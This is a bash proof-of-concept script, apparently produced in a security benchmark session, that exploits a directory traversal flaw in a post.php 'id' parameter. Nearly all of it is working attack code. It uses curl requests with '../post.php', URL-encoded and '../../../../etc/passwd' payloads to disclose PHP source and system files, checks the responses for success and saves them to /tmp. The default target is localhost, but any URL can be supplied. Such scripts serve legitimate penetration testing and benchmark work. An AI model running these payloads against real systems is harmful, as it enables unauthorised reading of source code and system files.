#!/bin/bash
# POC: Demonstrates directory traversal vulnerability in post.php via the 'id' parameter to access arbitrary files including source code
# Target: ./repo
# Created: 2025-12-01T15:44:42.987Z
# Session: benchmark-XBEN-061-24-minbd4b8

# Directory Traversal POC - post.php id parameter
# This script demonstrates the ability to traverse directories and access arbitrary files

TARGET_URL="${1:-http://localhost/post.php}"
OUTPUT_FILE="/tmp/traversal_results.txt"

echo "[*] Directory Traversal POC - post.php id parameter"
echo "[*] Target: $TARGET_URL"
echo "[*] Testing directory traversal with ../post.php"
echo ""

# Test 1: Basic directory traversal to read post.php source code
echo "=== Test 1: Reading post.php source code via directory traversal ==="
RESPONSE=$(curl -s "${TARGET_URL}?id=../post.php")

# Check if we got the source code (indicators: php tags, function definitions, etc)
if echo "$RESPONSE" | grep -q "<?php\|function\|include\|<pre>"; then
    echo "[+] SUCCESS: Source code disclosure detected!"
    echo "[+] Response contains PHP code indicators"
    echo "$RESPONSE" > "$OUTPUT_FILE"
    echo "[+] Full response saved to: $OUTPUT_FILE"
    echo ""
    echo "=== Source Code Preview ==="
    echo "$RESPONSE" | head -50
    echo ""
    exit 0
else
    echo "[-] Response does not appear to contain source code"
    echo "[-] Response preview:"
    echo "$RESPONSE" | head -20
    echo ""
fi

# Test 2: Try alternative traversal pattern
echo "=== Test 2: Trying alternative traversal pattern ==="
RESPONSE2=$(curl -s "${TARGET_URL}?id=..%2Fpost.php")

if echo "$RESPONSE2" | grep -q "<?php\|function\|include"; then
    echo "[+] SUCCESS: URL-encoded traversal worked!"
    echo "$RESPONSE2" > "$OUTPUT_FILE"
    exit 0
else
    echo "[-] URL-encoded traversal pattern did not work"
fi

# Test 3: Check for /etc/passwd access
echo "=== Test 3: Attempting to read /etc/passwd ==="
RESPONSE3=$(curl -s "${TARGET_URL}?id=../../../../etc/passwd")

if echo "$RESPONSE3" | grep -q "root:\|bin/bash"; then
    echo "[+] SUCCESS: /etc/passwd accessible via traversal!"
    echo "[+] Response contains passwd entries"
    echo "$RESPONSE3" > "$OUTPUT_FILE"
    exit 0
else
    echo "[-] Could not access /etc/passwd"
fi

echo ""
echo "[-] Vulnerability not confirmed with standard traversal patterns"
exit 1